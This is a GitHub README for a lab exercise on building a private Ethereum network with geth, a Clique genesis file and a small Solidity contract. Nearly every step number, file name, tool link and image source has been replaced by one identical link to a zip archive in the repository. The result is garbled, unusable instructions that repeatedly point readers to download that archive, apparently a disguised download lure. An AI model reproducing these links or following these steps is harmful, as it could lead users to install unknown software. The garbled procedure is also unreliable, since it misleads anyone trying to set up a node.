
# https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip
## CREATING A PRIVATE BLOCKCHAIN
## AIM
To create a Private Blockchain and to add nodes, create accounts, transfer Ether into it by creating
and deploying Smart contract.
## PROCEDURE:

```
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip to https https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip and download the software for windows. While installing select
both geth and development tools.
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip check whether the geth is installed ,run “geth” command in your command prompt.
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip create a Private Blockchain , we must create a genesis block.
In your command prompt, create a directory go-ethereum.
mkdir go-ethereum
cd go-ethereum
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip two nodes inside go-ethereum.
mkdir node1
mkdir node2
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip vs code using “code .”
To create account for two nodes
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip terminal in vs code and change directory to node1.
cd node1
geth --datadir "./data" account new
Save the public address and password of node1 in https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip
3
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip the same procedures for node2
cd ..
cd node2
geth --datadir "./data" account new
Save the public address and password of node2 in https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip
To create a genesis block
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip a file named “https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip” inside go-ethereum.
 Replace {Chain id } with your own chain id and check whether it exists or not using https
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip
 Replace initial signer address and firstnode address with node1 address saved in https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip
 And second node with node2 address saved in https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip
 Then replace balance as “3000000000000000000” for both nodes.
To configure both nodes using genesis block
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip directory to node1 in terminal and run this command.
geth --datadir ./data init https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip terminal and cd to node2 and run the same.
11. Again split terminal and create bootnode.
mkdir bnode
cd bnode
12. To generate key
bootnode -genkey https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip
bootnode -nodekey https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip verbosity 7 -addr "127.0.0.1 30301"
4
13. save the enode value in https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip node1 and node2
To start node1 > geth --datadir "./data" --port 30304 --bootnodes enode //{ YOUR_VALUE } --
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip 8547 --ipcdisable --allow-insecure-unlock --http https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip"https
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip" https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip web3,eth,debug,personal,net --networkid { NETWORK_ID } --
unlock { ADDRESS_NODE1 } --password { PASSWORD_FILE_NAME_EXTENSION } --
mine https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip { SIGNER_ADDRESS }
To start node2 > geth --datadir "./data" --port 30306 --bootnodes enode //{ YOUR_VALUE } -
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip 8546 --networkid { NETWORK_ID } --unlock { ADDRESS_NODE2 } --password
{ PASSWORD_FILE_WITH_EXTENSION }
 Replace Node1 address in {signer address} and {address node1} and enode value with
{your value}
 {Network id} is your chain id given in https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip
 Create https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip undernode1 and node2 and enter the password in it.
 Replace https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip with { PASSWORD_FILE_NAME_EXTENSION }.
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip to https https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip and in left pane click deploy and run transactions icon.
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip the environment to Custom-External HTTP Provider
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip on file and under contract, create new file named “https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip”
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip the file and go to deploy tab and click deploy.
https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip has deployed and added to blockchain.
```
## PROGRAM
```
#Genesis file https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip
{
"config" {
"chainId" 878787,
"homesteadBlock" 0,
"eip150Block" 0,
"eip155Block" 0,
"eip158Block" 0,
"byzantiumBlock" 0,
"constantinopleBlock" 0,
"petersburgBlock" 0,
"istanbulBlock" 0,
"berlinBlock" 0,
"clique" {
"period" 5,
"epoch" 30000
}
},
"difficulty" "1",
"gasLimit" "8000000",
"extradata"
"0x00000000000000000000000000000000000000000000000000000000000000001d09cd3F475a65
7381b223A9c91029865b27E0270000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000000",
"alloc" {
"1d09cd3F475a657381b223A9c91029865b27E027" { "balance" "3000000000000000000" },
"e503980FB9E4D17048b973B0ee01759DcF2d7879" { "balance" "3000000000000000000" }
}
}
```
## Smart Contract https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip
```
//SPDX-License-Identifier MIT
pragma solidity ^0.8.19;
contract New{
string name;
function setName(string memory _name) public {
name= _name;
}
function getName() public view returns (string memory){
return name;
}
}
```
## OUTPUT
# Deploying Transaction in Remix
<img width="1920" height="1080" alt="Screenshot 2025-09-17 165643" src="https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip" />
<img width="1920" height="1080" alt="Screenshot 2025-09-18 092001" src="https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip" />

# Contract Creation Output in Command Prompt
<img width="1920" height="1080" alt="Screenshot 2025-09-18 092056" src="https://github.com/Yugabharathi91/Blockchain-for-business/raw/refs/heads/main/mollycosset/business_Blockchain_for_v1.6-beta.5.zip" />


## RESULT: 
Thus, the Private Blockchain is created, nodes are added with accounts, and Ether is transferred
into it by creating and deploying Smart contract successfully
